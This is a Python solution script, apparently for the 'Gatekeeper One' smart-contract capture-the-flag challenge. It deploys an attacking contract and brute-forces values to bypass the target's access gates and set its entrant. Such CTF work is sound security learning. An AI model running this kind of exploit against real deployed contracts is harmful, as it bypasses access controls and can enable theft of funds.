#!/usr/bin/python3
from ape import accounts, project
from rich.console import Console

ADDRESS = "0x1E1DB5a282b69C0be34B3075754F4BE26F8637dC"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.GatekeeperOne.at(ADDRESS)

    console.print(f"[green]Entrant Before The Hack: [magenta]{target_contract.entrant()}")
    attacking_contract = project.GatekeeperOneAttack.deploy(sender=attacker)
    for i in range(100, 300):
        try:
            attacking_contract.forceEnter(ADDRESS, i, sender=attacker)
        except:
            pass

    console.print(f"[green]Entrant After The Hack: [magenta]{target_contract.entrant()}")

    assert target_contract.entrant() != "0x0000000000000000000000000000000000000000"



def main():
    attack()


if __name__ == "__main__":
    main()